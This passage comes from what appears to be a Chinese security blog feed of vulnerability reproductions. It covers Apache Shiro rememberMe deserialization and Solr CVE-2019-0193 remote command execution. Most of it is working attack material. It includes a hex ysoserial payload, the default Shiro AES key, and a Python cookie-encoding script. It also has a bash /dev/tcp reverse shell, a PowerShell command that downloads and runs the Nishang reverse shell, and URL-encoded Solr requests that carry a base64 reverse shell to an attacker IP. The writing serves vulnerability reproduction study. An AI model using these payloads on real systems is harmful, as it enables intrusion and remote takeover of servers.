<span class="number">726D0100</span> <span class="number">72284C63</span> <span class="number">6F6D2F73</span> <span class="number">756</span>E2F6F <span class="number">72672F61</span> <span class="number">70616368</span> <span class="number">652F7861</span> <span class="number">6</span>C616E2F <span class="number">696E7465</span> <span class="number">726</span>E616C <span class="number">2</span>F78736C <span class="number">74632F44</span> <span class="number">4</span>F4D3B5B <span class="number">4</span>C636F6D <span class="number">2</span>F73756E <span class="number">2F6F7267</span> <span class="number">2F617061</span> <span class="number">6368652</span>F <span class="number">786</span>D6C2F <span class="number">696E7465</span> <span class="number">726</span>E616C <span class="number">2F736572</span> <span class="number">69616C69</span> <span class="number">7</span>A65722F <span class="number">53657269</span> <span class="number">616</span>C697A <span class="number">6174696</span>F <span class="number">6</span>E48616E <span class="number">646C6572</span> <span class="number">3B295601</span> <span class="number">0008646</span>F <span class="number">63756D65</span> <span class="number">6E740100</span> <span class="number">2</span>D4C636F <span class="number">6D2F7375</span> <span class="number">6E2F6F72</span> <span class="number">672F6170</span> <span class="number">61636865</span> <span class="number">2</span>F78616C <span class="number">616E2F69</span> <span class="number">6E746572</span> <span class="number">6</span>E616C2F <span class="number">78736C74</span> <span class="number">632</span>F444F <span class="number">4D3B0100</span> <span class="number">0868616</span>E <span class="number">646C6572</span> <span class="number">73010042</span> <span class="number">5</span>B4C636F <span class="number">6D2F7375</span> <span class="number">6E2F6F72</span> <span class="number">672F6170</span> <span class="number">61636865</span> <span class="number">2</span>F786D6C <span class="number">2F696E74</span> <span class="number">65726E61</span> <span class="number">6C2F7365</span> <span class="number">7269616</span>C <span class="number">697A6572</span> <span class="number">2F536572</span> <span class="number">69616C69</span> <span class="number">7A617469</span> <span class="number">6F6E4861</span> <span class="number">6E646C65</span> <span class="number">723B0100</span> <span class="number">0A457863</span> <span class="number">65707469</span> <span class="number">6F6E7307</span> <span class="number">00270100</span> A6284C63 <span class="number">6F6D2F73</span> <span class="number">756</span>E2F6F <span class="number">72672F61</span> <span class="number">70616368</span> <span class="number">652F7861</span> <span class="number">6</span>C616E2F <span class="number">696E7465</span> <span class="number">726</span>E616C <span class="number">2</span>F78736C <span class="number">74632F44</span> <span class="number">4</span>F4D3B4C <span class="number">636</span>F6D2F <span class="number">73756</span>E2F <span class="number">6</span>F72672F <span class="number">61706163</span> <span class="number">68652F78</span> <span class="number">6D6C2F69</span> <span class="number">6E746572</span> <span class="number">6</span>E616C2F <span class="number">64746</span>D2F <span class="number">44544D41</span> <span class="number">78697349</span> <span class="number">74657261</span> <span class="number">746</span>F723B <span class="number">4</span>C636F6D <span class="number">2</span>F73756E <span class="number">2F6F7267</span> <span class="number">2F617061</span> <span class="number">6368652</span>F <span class="number">786</span>D6C2F <span class="number">696E7465</span> <span class="number">726</span>E616C <span class="number">2F736572</span> <span class="number">69616C69</span> <span class="number">7</span>A65722F <span class="number">53657269</span> <span class="number">616</span>C697A <span class="number">6174696</span>F <span class="number">6</span>E48616E <span class="number">646C6572</span> <span class="number">3B295601</span> <span class="number">00086974</span> <span class="number">65726174</span> <span class="number">6F720100</span> <span class="number">354</span>C636F <span class="number">6D2F7375</span> <span class="number">6E2F6F72</span> <span class="number">672F6170</span> <span class="number">61636865</span> <span class="number">2</span>F786D6C <span class="number">2F696E74</span> <span class="number">65726E61</span> <span class="number">6C2F6474</span> <span class="number">6D2F4454</span> <span class="number">4D417869</span> <span class="number">73497465</span> <span class="number">7261746</span>F <span class="number">723B0100</span> <span class="number">0768616</span>E <span class="number">646C6572</span> <span class="number">0100414</span>C <span class="number">636</span>F6D2F <span class="number">73756</span>E2F <span class="number">6</span>F72672F <span class="number">61706163</span> <span class="number">68652F78</span> <span class="number">6D6C2F69</span> <span class="number">6E746572</span> <span class="number">6</span>E616C2F <span class="number">73657269</span> <span class="number">616</span>C697A <span class="number">65722F53</span> <span class="number">65726961</span> <span class="number">6C697A61</span> <span class="number">74696</span>F6E <span class="number">48616E64</span> <span class="number">6</span>C65723B <span class="number">01000A53</span> <span class="number">6F757263</span> <span class="number">6546696</span>C <span class="number">6501000</span>C <span class="number">47616467</span> <span class="number">6574732</span>E <span class="number">6A617661</span> <span class="number">0C000A00</span> <span class="number">0B070028</span> <span class="number">01003379</span> <span class="number">736F7365</span> <span class="number">7269616</span>C <span class="number">2F706179</span> <span class="number">6C6F6164</span> <span class="number">732F7574</span> <span class="number">696C2F47</span> <span class="number">61646765</span> <span class="number">74732453</span> <span class="number">74756254</span> <span class="number">72616E73</span> <span class="number">6C657450</span> <span class="number">61796</span>C6F <span class="number">61640100</span> <span class="number">40636</span>F6D <span class="number">2</span>F73756E <span class="number">2F6F7267</span> <span class="number">2F617061</span> <span class="number">6368652</span>F <span class="number">78616C61</span> <span class="number">6</span>E2F696E <span class="number">7465726</span>E <span class="number">616C2F78</span> <span class="number">736C7463</span> <span class="number">2</span>F72756E <span class="number">74696D65</span> <span class="number">2F416273</span> <span class="number">74726163</span> <span class="number">74547261</span> <span class="number">6E736C65</span> <span class="number">74010014</span> <span class="number">6A617661</span> <span class="number">2</span>F696F2F <span class="number">53657269</span> <span class="number">616</span>C697A <span class="number">61626C65</span> <span class="number">01003963</span> <span class="number">6F6D2F73</span> <span class="number">756</span>E2F6F <span class="number">72672F61</span> <span class="number">70616368</span> <span class="number">652F7861</span> <span class="number">6</span>C616E2F <span class="number">696E7465</span> <span class="number">726</span>E616C <span class="number">2</span>F78736C <span class="number">74632F54</span> <span class="number">72616E73</span> <span class="number">6C657445</span> <span class="number">78636570</span> <span class="number">74696</span>F6E <span class="number">01001F79</span> <span class="number">736F7365</span> <span class="number">7269616</span>C <span class="number">2F706179</span> <span class="number">6C6F6164</span> <span class="number">732F7574</span> <span class="number">696C2F47</span> <span class="number">61646765</span> <span class="number">74730100</span> <span class="number">083</span>C636C <span class="number">696E6974</span> <span class="number">3E010011</span> <span class="number">6A617661</span> <span class="number">2</span>F6C616E <span class="number">672F5275</span> <span class="number">6</span>E74696D <span class="number">6507002</span><span class="keyword">A</span> <span class="number">01000A67</span> <span class="number">65745275</span> <span class="number">6</span>E74696D <span class="number">65010015</span> <span class="number">28294</span>C6A <span class="number">6176612</span>F <span class="number">6C616E67</span> <span class="number">2</span>F52756E <span class="number">74696D65</span> <span class="number">3</span>B0C002C <span class="number">002D0A00</span> <span class="number">2B002E01</span> <span class="number">00257069</span> <span class="number">6</span>E67202D <span class="number">63203320</span> &#123;numint&#125; <span class="number">2E736869</span> <span class="number">726F2E74</span> <span class="number">6573742</span>E <span class="number">646</span>E736C <span class="number">6</span>F672E6C <span class="number">696E6B08</span> <span class="number">00300100</span> <span class="number">04657865</span> <span class="number">63010027</span> <span class="number">284C6A61</span> <span class="number">76612</span>F6C <span class="number">616</span>E672F <span class="number">53747269</span> <span class="number">6E673B29</span> <span class="number">4C6A6176</span> <span class="number">612F6C61</span> <span class="number">6E672F50</span> <span class="number">726F6365</span> <span class="number">73733</span>B0C <span class="number">00320033</span> <span class="number">0A002B00</span> <span class="number">3401001</span>E <span class="number">79736F73</span> <span class="number">65726961</span> <span class="number">6C2F5077</span> <span class="number">6E657235</span> <span class="number">35303139</span> <span class="number">30393134</span> <span class="number">31373635</span> <span class="number">39390100</span> <span class="number">204C7973</span> <span class="number">6F736572</span> <span class="number">69616</span>C2F <span class="number">50776E65</span> <span class="number">72353530</span> <span class="number">31393039</span> <span class="number">31343137</span> <span class="number">36353939</span> <span class="number">3B002100</span> <span class="number">02000300</span> <span class="number">01000400</span> <span class="number">01001A00</span> <span class="number">05000600</span> <span class="number">01000700</span> <span class="number">00000200</span> <span class="number">08000400</span> <span class="number">01000A00</span> <span class="number">0B000100</span> <span class="number">0C000000</span> <span class="number">2F000100</span> <span class="number">01000000</span> <span class="number">052</span>AB7<span class="number">00 01B10000</span> <span class="number">0002000</span>D <span class="number">00000006</span> <span class="number">00010000</span> <span class="number">002</span>E000E <span class="number">0000000</span>C <span class="number">00010000</span> <span class="number">0005000</span>F <span class="number">00370000</span> <span class="number">00010013</span> <span class="number">00140002</span> <span class="number">000C0000</span> <span class="number">003F0000</span> <span class="number">00030000</span> <span class="number">0001B100</span> <span class="number">00000200</span> <span class="number">0D000000</span> <span class="number">06000100</span> <span class="number">00003300</span> <span class="number">0E000000</span> <span class="number">20000300</span> <span class="number">00000100</span> <span class="number">0F003700</span> <span class="number">00000000</span> <span class="number">01001500</span> <span class="number">16000100</span> <span class="number">00000100</span> <span class="number">17001800</span> <span class="number">02001900</span> <span class="number">00000400</span> <span class="number">01001A00</span> <span class="number">01001300</span> <span class="number">1B000200</span> <span class="number">0C000000</span> <span class="number">49000000</span> <span class="number">04000000</span> <span class="number">01B10000</span> <span class="number">0002000</span>D <span class="number">00000006</span> <span class="number">00010000</span> <span class="number">0037000</span>E <span class="number">0000002</span><span class="keyword">A</span> <span class="number">00040000</span> <span class="number">0001000</span>F <span class="number">00370000</span> <span class="number">00000001</span> <span class="number">00150016</span> <span class="number">00010000</span> <span class="number">0001001</span>C <span class="number">001D0002</span> <span class="number">00000001</span> <span class="number">001</span>E001F <span class="number">00030019</span> <span class="number">00000004</span> <span class="number">0001001</span><span class="keyword">A</span> <span class="number">00080029</span> <span class="number">000B0001</span> <span class="number">000C0000</span> <span class="number">001B0003</span> <span class="number">00020000</span> <span class="number">000</span>FA700 <span class="number">03014</span>CB8 <span class="number">002F1231</span> B<span class="number">6003557</span> B<span class="number">1000000</span> <span class="number">00000200</span> <span class="number">20000000</span> <span class="number">02002100</span> <span class="number">11000000</span> <span class="number">0A000100</span> <span class="number">02002300</span> <span class="number">10000975</span> <span class="number">71007E00</span> <span class="number">1A000001</span> D4CAFEBA BE000000 <span class="number">31001</span>B0A <span class="number">00030015</span> <span class="number">07001707</span> <span class="number">00180700</span> <span class="number">19010010</span> <span class="number">73657269</span> <span class="number">616C5665</span> <span class="number">7273696</span>F <span class="number">6E554944</span> <span class="number">0100014</span><span class="keyword">A</span> <span class="number">01000D43</span> <span class="number">6F6E7374</span> <span class="number">616E7456</span> <span class="number">616C7565</span> <span class="number">0571E669</span> EE3C6D<span class="number">47 18010006</span> <span class="number">3C696E69</span> <span class="number">743E0100</span> <span class="number">03282956</span> <span class="number">01000443</span> <span class="number">6F646501</span> <span class="number">000F4C69</span> <span class="number">6E654E75</span> <span class="number">6D626572</span> <span class="number">5461626</span>C <span class="number">65010012</span> <span class="number">4C6F6361</span> <span class="number">6C566172</span> <span class="number">6961626</span>C <span class="number">65546162</span> <span class="number">6C650100</span> <span class="number">04746869</span> <span class="number">73010003</span> <span class="number">466F6F01</span> <span class="number">000</span>C496E <span class="number">6E657243</span> <span class="number">6C617373</span> <span class="number">65730100</span> <span class="number">254C7973</span> <span class="number">6F736572</span> <span class="number">69616</span>C2F <span class="number">7061796</span>C <span class="number">6F616473</span> <span class="number">2F757469</span> <span class="number">6C2F4761</span> <span class="number">64676574</span> <span class="number">7324466</span>F <span class="number">6F3B0100</span> <span class="number">0A536F75</span> <span class="number">72636546</span> <span class="number">696C6501</span> <span class="number">000C4761</span> <span class="number">64676574</span> <span class="number">732E6A61</span> <span class="number">76610C00</span> <span class="number">0A000B07</span> <span class="number">001A0100</span> <span class="number">2379736</span>F <span class="number">73657269</span> <span class="number">616C2F70</span> <span class="number">61796</span>C6F <span class="number">6164732</span>F <span class="number">7574696</span>C <span class="number">2F476164</span> <span class="number">67657473</span> <span class="number">24466</span>F6F <span class="number">0100106</span><span class="keyword">A</span> <span class="number">6176612</span>F <span class="number">6C616E67</span> <span class="number">2</span>F4F626A <span class="number">65637401</span> <span class="number">00146A61</span> <span class="number">76612F69</span> <span class="number">6F2F5365</span> <span class="number">7269616</span>C <span class="number">697A6162</span> <span class="number">6C650100</span> <span class="number">1</span>F79736F <span class="number">73657269</span> <span class="number">616C2F70</span> <span class="number">61796</span>C6F <span class="number">6164732</span>F <span class="number">7574696</span>C <span class="number">2F476164</span> <span class="number">67657473</span> <span class="number">00210002</span> <span class="number">00030001</span> <span class="number">00040001</span> <span class="number">001A0005</span> <span class="number">00060001</span> <span class="number">00070000</span> <span class="number">00020008</span> <span class="number">00010001</span> <span class="number">000</span>A000B <span class="number">0001000</span>C <span class="number">0000002</span>F <span class="number">00010001</span> <span class="number">00000005</span> <span class="number">2</span>AB70001 B<span class="number">1000000</span> <span class="number">02000D00</span> <span class="number">00000600</span> <span class="number">01000000</span> <span class="number">3B000E00</span> <span class="number">00000C00</span> <span class="number">01000000</span> <span class="number">05000F00</span> <span class="number">12000000</span> <span class="number">02001300</span> <span class="number">00000200</span> <span class="number">14001100</span> <span class="number">00000A00</span> <span class="number">01000200</span> <span class="number">16001000</span> <span class="number">09707400</span> <span class="number">0450776</span>E <span class="number">72707701</span> <span class="number">00787372</span> <span class="number">00116A61</span> <span class="number">76612</span>E6C <span class="number">616</span>E672E <span class="number">496E7465</span> <span class="number">67657212</span> E<span class="number">2A0A4F7</span> <span class="number">81873802</span> <span class="number">00014900</span> <span class="number">0576616</span>C <span class="number">75657872</span> <span class="number">00106A61</span> <span class="number">76612</span>E6C <span class="number">616</span>E672E <span class="number">4E756D62</span> <span class="number">657286</span>AC <span class="number">951D0B94</span> E08B0<span class="number">200 00787000</span> <span class="number">00000178</span>".format(numint=binascii.b2a_hex(str(numint))).replace(' ', '').decode('hex')</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = "kPH+bIxk5D2deZiIxcaaaA=="</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(payload)</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">poc("http://<span class="number">172.16.49.233</span>/")</span><br></pre></td></tr></table></figure><a id="more"></a>





<p>脚本地址如下，将ip地址改为Shiro地址即可</p>
<p><a href="https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py</a></p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085254278.png" alt="image-20200728085254278"></p>
<p>查看dnslog平台有反馈</p>
<p>登录：<a href="http://admin.dnslog.link/" target="_blank" rel="noopener">http://admin.dnslog.link/</a> 账号：test 密码：123456</p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085321780.png" alt="image-20200728085321780"></p>
<p>生成反弹shell命令：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">172.16</span><span class="number">.49</span><span class="number">.33</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>   #ip为攻击机地址</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085349392.png" alt="image-20200728085349392"></p>
<p>VPS设置监听</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-<span class="number">0.0</span>.<span class="number">6</span>-SNAPSHOT-all<span class="selector-class">.jar</span> ysoserial<span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span> <span class="number">5555</span> CommonsCollections2 <span class="string">'bash -c &#123;echo,IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjQ5LjMzLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span>   #攻击机执行</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085421069.png" alt="image-20200728085421069"></p>
<p>使用Python代码进行编码，代码如下</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">import sys</span><br><span class="line">import <span class="built_in">uuid</span></span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line"><span class="built_in">from</span> Crypto.Cipher import AES</span><br><span class="line"> </span><br><span class="line">def encode_rememberme(<span class="keyword">command</span>):  #<span class="title">ysoserial-0</span><span class="number">.0</span><span class="number">.6</span>-SNAPSHOT-all.<span class="title">jar</span> #文件需要在该文件目录</span><br><span class="line"></span><br><span class="line">     popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, <span class="keyword">command</span>], <span class="title">stdout</span>=<span class="title">subprocess</span>.<span class="title">PIPE</span>)</span><br><span class="line">     BS = AES.block_size</span><br><span class="line">     pad = lambda s: s + ((BS - <span class="built_in">len</span>(s) % BS) * chr(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">     key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">     iv = <span class="built_in">uuid</span>.uuid4().<span class="keyword">bytes</span></span><br><span class="line">     encryptor = AES.<span class="built_in">new</span>(key, AES.MODE_CBC, iv)</span><br><span class="line">     file_body = pad(popen.<span class="keyword">stdout</span>.<span class="built_in">read</span>())</span><br><span class="line">     base64_ciphertext = base64.b64encode(iv + encryptor.<span class="built_in">encrypt</span>(file_body))</span><br><span class="line">     <span class="literal">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">print <span class="string">"rememberMe=&#123;0&#125;"</span>.<span class="built_in">format</span>(payload.decode())</span><br></pre></td></tr></table></figure>

<p>攻击机执行如下命令，ip为攻击机地址</p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085449532.png" alt="image-20200728085449532"></p>
<p>攻击机开启坚挺</p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085517392.png" alt="image-20200728085517392"></p>
<p>将remember代码到cookie执行</p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085542739.png" alt="image-20200728085542739"></p>
<p>攻击机成功返弹shell</p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085629622.png" alt="image-20200728085629622"></p>
<p>再去查看监听的5555端口有数据传输</p>
<p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085655587.png" alt="image-20200728085655587"></p>
<h4 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h4><h5 id="Windows丽颖powershell反弹shell脚本"><a href="#Windows丽颖powershell反弹shell脚本" class="headerlink" title="Windows丽颖powershell反弹shell脚本"></a>Windows丽颖powershell反弹shell脚本</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections5 "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.xx.xx -port 2333"</span><br></pre></td></tr></table></figure>

<p>其余操作与Linux相同</p>
<h3 id="Shiro一键检测脚本"><a href="#Shiro一键检测脚本" class="headerlink" title="Shiro一键检测脚本"></a>Shiro一键检测脚本</h3><p><a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/yuyan-sec/p/12458806.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuyan-sec/p/12458806.html</a></p>
<p><a href="https://www.cnblogs.com/paperpen/p/11312671.html" target="_blank" rel="noopener">https://www.cnblogs.com/paperpen/p/11312671.html</a></p>
<p><a href="https://www.secpulse.com/archives/112742.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/112742.html</a></p>
<p><a href="https://download.csdn.net/download/u013286283/10334372" target="_blank" rel="noopener">https://download.csdn.net/download/u013286283/10334372</a></p>
<p><a href="https://blog.csdn.net/u011975363/article/details/102391669" target="_blank" rel="noopener">https://blog.csdn.net/u011975363/article/details/102391669</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Solr（CVE-2019-0193）远程命令执行漏洞复现</title>
    <url>/2020/07/26/Solr%EF%BC%88CVE-2019-0193%EF%BC%89%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>###Solr（CVE-2019-0193）远程命令执行漏洞复现</p><p>Docker搭建环境</p><p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200727222953799.png" alt="image-20200727222953799"></p><p>进入Solr后找到如下路径，点击Dataimport–&gt;Debug-Mode后输入如下代码</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"URLDataSource"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span><span class="params">()</span></span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">"touch /tmp/success"</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"stackoverflow"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">url</span>=<span class="string">"https://stackoverflow.com/feeds/tag/solr"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">processor</span>=<span class="string">"XPathEntityProcessor"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">forEach</span>=<span class="string">"/feed"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">transformer</span>=<span class="string">"script:poc"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>





<p>最后点击Execute with this Configuration保存</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200727223704777.png" alt="image-20200727223704777"></p>
<p>抓包如下</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200727223749534.png" alt="image-20200727223749534"></p>
<p>数据包内容如下</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">command=full-import&amp;verbose=<span class="keyword">false</span>&amp;clean=<span class="keyword">false</span>&amp;commit=<span class="keyword">true</span>&amp;debug=<span class="keyword">true</span>&amp;core=test&amp;dataConfig=<span class="symbol">%3</span>CdataConfig<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>CdataSource+<span class="keyword">type</span><span class="symbol">%3</span>D<span class="symbol">%22</span>URLDataSource<span class="symbol">%22</span><span class="symbol">%2</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>Cscript<span class="symbol">%3</span>E<span class="symbol">%3</span>C!<span class="symbol">%5</span>BCDATA<span class="symbol">%5</span>B<span class="symbol">%0</span>A++++++++++function+poc()<span class="symbol">%7</span>B+java.lang.Runtime.getRuntime().exec(<span class="symbol">%22</span>touch+<span class="symbol">%2</span>Ftmp<span class="symbol">%2</span>Fsuccess<span class="symbol">%22</span>)<span class="symbol">%3</span>B<span class="symbol">%0</span>A++++++++++<span class="symbol">%7</span>D<span class="symbol">%0</span>A++<span class="symbol">%5</span>D<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%3</span>C<span class="symbol">%2</span>Fscript<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>Cdocument<span class="symbol">%3</span>E<span class="symbol">%0</span>A++++<span class="symbol">%3</span>Centity+name<span class="symbol">%3</span>D<span class="symbol">%22</span>stackoverflow<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++url<span class="symbol">%3</span>D<span class="symbol">%22</span>https<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>Fstackoverflow.com<span class="symbol">%2</span>Ffeeds<span class="symbol">%2</span>Ftag<span class="symbol">%2</span>Fsolr<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++processor<span class="symbol">%3</span>D<span class="symbol">%22</span>XPathEntityProcessor<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++forEach<span class="symbol">%3</span>D<span class="symbol">%22</span><span class="symbol">%2</span>Ffeed<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++transformer<span class="symbol">%3</span>D<span class="symbol">%22</span>script<span class="symbol">%3</span>Apoc<span class="symbol">%22</span>+<span class="symbol">%2</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>C<span class="symbol">%2</span>Fdocument<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="symbol">%2</span>FdataConfig<span class="symbol">%3</span>E&amp;name=dataimport</span><br></pre></td></tr></table></figure>

<p>查看系统成功写入success</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200728092802547.png" alt="image-20200728092802547"></p>
<p>分析数据包发现做了一定的编码处理</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200728092822291.png" alt="image-20200728092822291"></p>
<p>将编码改为反弹shell命令</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200727105154889.png" alt></p>
<p>其中反弹shell命令需要经过如下平台出处理</p>
<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>类似如下</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200727105544021.png" alt></p>
<p>抓包修改数据包如下</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">command=full-import&amp;verbose=<span class="keyword">false</span>&amp;clean=<span class="keyword">false</span>&amp;commit=<span class="keyword">true</span>&amp;debug=<span class="keyword">true</span>&amp;core=test&amp;dataConfig=<span class="symbol">%3</span>CdataConfig<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>CdataSource+<span class="keyword">type</span><span class="symbol">%3</span>D<span class="symbol">%22</span>URLDataSource<span class="symbol">%22</span><span class="symbol">%2</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>Cscript<span class="symbol">%3</span>E<span class="symbol">%3</span>C!<span class="symbol">%5</span>BCDATA<span class="symbol">%5</span>B<span class="symbol">%0</span>A++++++++++function+poc()<span class="symbol">%7</span>B+java.lang.Runtime.getRuntime().exec(<span class="symbol">%22</span>bash+-<span class="keyword">c</span>+<span class="symbol">%7</span>Becho<span class="symbol">%2</span>CYmFzaCAtaSA<span class="symbol">%2</span>BJiAvZGV<span class="number">2</span>L<span class="number">3</span>RjcC<span class="number">8</span>xMDQuMTI<span class="number">4</span>Ljg<span class="number">1</span>Ljc<span class="number">3</span>LzE<span class="number">3</span>Nzc<span class="number">3</span>IDA<span class="symbol">%2</span>BJjE<span class="symbol">%3</span>D<span class="symbol">%7</span>D<span class="symbol">%7</span>C<span class="symbol">%7</span>Bbase<span class="number">64</span><span class="symbol">%2</span>C-d<span class="symbol">%7</span>D<span class="symbol">%7</span>C<span class="symbol">%7</span>Bbash<span class="symbol">%2</span>C-i<span class="symbol">%7</span>D<span class="symbol">%22</span>)<span class="symbol">%3</span>B<span class="symbol">%0</span>A++++++++++<span class="symbol">%7</span>D<span class="symbol">%0</span>A++<span class="symbol">%5</span>D<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%3</span>C<span class="symbol">%2</span>Fscript<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>Cdocument<span class="symbol">%3</span>E<span class="symbol">%0</span>A++++<span class="symbol">%3</span>Centity+name<span class="symbol">%3</span>D<span class="symbol">%22</span>stackoverflow<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++url<span class="symbol">%3</span>D<span class="symbol">%22</span>https<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>Fstackoverflow.com<span class="symbol">%2</span>Ffeeds<span class="symbol">%2</span>Ftag<span class="symbol">%2</span>Fsolr<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++processor<span class="symbol">%3</span>D<span class="symbol">%22</span>XPathEntityProcessor<span class="symbol">%22</span><span class="symbol">%0</span>A++++++++++++forEach<span class="symbol">%3</span>D<span class="symbol">%22</span><span class="symbol">%2</span>Ffeed<span class="symbol">%22</span><span 